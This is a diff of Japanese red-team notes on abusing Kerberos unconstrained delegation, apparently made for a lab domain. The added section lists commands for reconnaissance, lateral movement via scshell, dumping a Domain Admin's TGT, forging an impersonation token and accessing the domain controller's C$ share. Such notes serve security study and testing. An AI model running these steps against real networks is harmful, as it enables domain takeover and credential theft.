@@ -18,7 +18,8 @@ Kerberos委任は、**あるプリンシパルが別のプリンシパルの代�
 ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))
 ```
 
-**ポイント：ドメインコントローラは常にこのフラグが有効**
+> [!NOTE]
+**ドメインコントローラは常にこのフラグが有効**
 
 **Unconstrained Delegation フロー：**
 ```
@@ -45,4 +46,68 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
 ```
 jobs
 jobkill 0
+```
+
+# アタックケース
+
+### 偵察
+
+Unconstrained Delegationが設定されてるコンピュータを探す
+```
+ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
+```
+
+### 横展開
+
+Unconstrained Delegationが設定されているコンピュータに横展開
+プロセスからコンピュータへのアクセス権があるユーザプロセスを窃取
+
+spawn用のプロセスをdllhost.exeに設定
+```
+ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
+```
+
+scshellを使用して移動
+```
+jump scshell64 lon-ws-1 smb
+```
+
+### 委任悪用
+
+はいったらチケットをリスト
+```
+krb_triage
+```
+
+ユーザがDomain Adminであることを確認
+```
+ldapsearch samAccountName=dyork --attributes memberOf
+```
+
+特定ユーザのTGTチケットをダンプ
+```
+krb_dump /luid:<LUID> /service:krbtgt
+krb_dump /user:dyork /service:krbtgt
+```
+
+### チケット悪用（トークン作成）
+
+ファイルにチケットをかき出し。
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi",[Convert]::FromBase64String("TGT"))
+```
+
+なりすまし用のトークン作成
+```
+make_token CONTOSO\dyork FakePass
+```
+
+ダンプしたチケットを利用
+```
+kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi
+```
+
+DCにアクセス
+```
+ls \\lon-dc-1\c$\
 ```
